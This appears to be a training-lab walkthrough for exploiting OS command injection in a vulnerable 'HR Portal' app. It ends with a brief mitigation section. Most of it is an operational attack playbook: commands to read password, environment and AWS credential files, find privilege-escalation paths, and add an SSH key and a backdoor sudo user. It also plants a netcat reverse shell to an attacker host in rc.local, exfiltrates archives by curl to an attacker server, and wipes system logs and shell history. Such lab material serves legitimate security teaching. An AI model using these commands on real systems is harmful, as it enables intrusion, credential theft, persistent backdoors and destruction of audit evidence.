
# Attack 2: OS Command Injection

This guide walks through exploiting OS Command Injection vulnerabilities in the HR Portal to gain unauthorized access.

## Step 1: Access the Document Upload Page

1. Log in to the HR Portal (you can use SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

## Step 2: Basic Command Injection 

1. In the "Upload Destination" dropdown, select "System Command - List Files (OS Injection)" or:
   - Select "Custom Location" and enter `cmd:ls -la`
2. Click "Execute Command"
3. The command will execute on the server and the response will display in the preview window

## Step 3: Information Gathering

Use OS command injection to gather information about the system:

1. Basic system commands:
   - `cmd:whoami` - Shows the current user running the application
   - `cmd:id` - Shows user ID and group memberships
   - `cmd:pwd` - Shows current working directory
   - `cmd:uname -a` - Shows system information
   - `cmd:ps aux` - Lists running processes

2. File system exploration:
   - `cmd:ls -la /` - List root directory
   - `cmd:ls -la /home` - List home directories
   - `cmd:ls -la /var/www` - List web directories
   - `cmd:ls -la /etc` - List configuration files

3. Finding sensitive information:
   - `cmd:cat /etc/passwd` - List all users
   - `cmd:find / -name "*.conf" -type f 2>/dev/null` - Find config files
   - `cmd:find / -name "*.env" -type f 2>/dev/null` - Find environment files
   - `cmd:find / -name "*.pem" -type f 2>/dev/null` - Find SSL certificates
   - `cmd:grep -r "password" /etc 2>/dev/null` - Search for passwords

## Step 4: Network Reconnaissance

Use OS command injection for network reconnaissance:

1. Network configuration:
   - `cmd:ifconfig` or `cmd:ip a` - Show network interfaces
   - `cmd:netstat -tuln` - Show listening ports
   - `cmd:cat /etc/hosts` - View hostname mappings

2. Network connectivity testing:
   - `cmd:ping -c 1 8.8.8.8` - Check external connectivity
   - `cmd:curl -I http://localhost` - Check local web server
   - `cmd:curl -I http://internal-jenkins:8080` - Check internal services

## Step 5: Credential Harvesting

Look for credentials and configuration files:

1. Check environment variables:
   - `cmd:env` or `cmd:printenv` - List all environment variables

2. Configuration files:
   - `cmd:cat /var/www/html/config.json` - Application config
   - `cmd:cat /etc/nginx/nginx.conf` - Web server config
   - `cmd:cat ~/.aws/credentials` - AWS credentials

3. Database credentials:
   - `cmd:find / -name "wp-config.php" 2>/dev/null` - WordPress config
   - `cmd:grep -r "username" --include="*.xml" --include="*.properties" /opt 2>/dev/null`

## Step 6: Privilege Escalation Techniques

Look for privilege escalation opportunities:

1. SUID binaries:
   - `cmd:find / -perm -u=s -type f 2>/dev/null` - Find SUID binaries

2. Sudo permissions:
   - `cmd:sudo -l` - Check what commands can be run as sudo

3. Cron jobs:
   - `cmd:cat /etc/crontab` - System cron jobs
   - `cmd:ls -la /etc/cron.*` - Cron directories

4. Process information:
   - `cmd:ps aux | grep root` - Look for processes running as root

## Step 7: Creating Persistence

Establish persistence on the system:

1. SSH key access:
   - `cmd:mkdir -p ~/.ssh`
   - `cmd:echo "ssh-rsa AAAA..." > ~/.ssh/authorized_keys`
   - `cmd:chmod 600 ~/.ssh/authorized_keys`

2. Add a backdoor user (requires root privileges):
   - `cmd:useradd -m -s /bin/bash hacker`
   - `cmd:echo "hacker:password" | chpasswd`
   - `cmd:usermod -aG sudo hacker`

3. Modify startup scripts:
   - `cmd:echo "nc -e /bin/bash attacker-ip 4444 &" >> /etc/rc.local`

## Step 8: Data Exfiltration

Exfiltrate data from the system:

1. Archiving data:
   - `cmd:tar czf /tmp/data.tar.gz /var/www/html`
   - `cmd:zip -r /tmp/data.zip /var/www/html`

2. Exfiltration via HTTP:
   - `cmd:curl -F "file=@/tmp/data.tar.gz" http://attacker-server/upload`

## Step 9: Covering Tracks

Cover your tracks:

1. Clear logs:
   - `cmd:echo > /var/log/auth.log`
   - `cmd:echo > /var/log/syslog`
   - `cmd:echo > ~/.bash_history`

2. Remove temporary files:
   - `cmd:rm -rf /tmp/data.tar.gz`

## Mitigation Strategies

To protect against OS command injection:

1. Input validation and sanitization
   - Validate inputs against an allowed list
   - Sanitize inputs by removing or escaping dangerous characters

2. Avoid direct command execution
   - Use built-in functionality instead of calling system commands
   - If command execution is necessary, use parameterized APIs

3. Implement a security policy
   - Use SecComp or AppArmor to restrict system calls
   - Run the application with minimal privileges

4. Use a web application firewall (WAF)
   - Implement a WAF to detect and block command injection attempts

5. Regular security testing
   - Perform regular security assessments to identify vulnerabilities

## Troubleshooting Command Injection Attacks

If your command injection attacks aren't working:

1. Make sure commands are properly URL-encoded
2. Try simple commands first (e.g., `cmd:whoami`) before complex ones
3. Check for command output filtering or sanitization
4. Try different command separators (e.g., `;`, `&&`, `||`)

Remember that in a real attack, OS command injection vulnerabilities can lead to complete system compromise, data theft, and unauthorized access to sensitive information.
